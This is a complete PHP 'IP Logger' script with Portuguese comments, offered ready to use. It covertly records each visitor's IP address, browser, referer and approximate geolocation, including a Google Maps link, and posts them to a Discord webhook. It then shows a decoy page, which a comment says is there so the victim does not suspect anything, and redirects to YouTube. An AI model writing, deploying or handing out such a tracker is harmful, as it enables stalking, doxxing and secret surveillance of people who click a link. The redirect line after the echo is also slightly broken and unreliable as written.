<?php
// === COLOQUE AQUI A URL DA SUA WEBHOOK ===
$webhookurl = "https://discord.com/api/webhooks/SEU_ID/SEU_TOKEN_AQUI";

// Pega o IP real (funciona na maioria dos hosts)
$ip = $_SERVER['REMOTE_ADDR'] ?? 'Desconhecido';

// Dados extras úteis
$browser = $_SERVER['HTTP_USER_AGENT'] ?? 'Desconhecido';
$data = date('d/m/Y H:i:s');
$referer = $_SERVER['HTTP_REFERER'] ?? 'Direto';

// Tenta pegar localização aproximada via IP (API gratuita)
$geo = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}"), true);
$pais = $geo['country'] ?? 'Desconhecido';
$cidade = $geo['city'] ?? 'Desconhecido';
$lat = $geo['lat'] ?? '';
$lon = $geo['lon'] ?? '';
$mapa = $lat && $lon ? "https://www.google.com/maps?q={$lat},{$lon}" : 'Sem localização';

// Monta a mensagem (bonita pro Discord)
$msg = "**Novo acesso detectado!**\n\n";
$msg .= "**IP:** {$ip}\n";
$msg .= "**Data/Hora:** {$data}\n";
$msg .= "**País:** {$pais}\n";
$msg .= "**Cidade:** {$cidade}\n";
$msg .= "**Navegador:** {$browser}\n";
$msg .= "**Origem:** {$referer}\n";
if ($mapa !== 'Sem localização') {
    $msg .= "**Mapa:** {$mapa}\n";
}

$payload = json_encode([
    "content" => $msg,
    "username" => "IP Logger",
    "avatar_url" => "https://i.imgur.com/alguma-imagem.png" // opcional
]);

// Envia para a webhook
$ch = curl_init($webhookurl);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

// Mostra uma página normal pro usuário (pra não desconfiar)
echo "<h1>Bem-vindo!</h1><p>Carregando...</p>";
// Aqui você pode redirecionar pra outro site real:
header("Location: https://youtube.com"); // ou o site que você quiser
exit;
?>
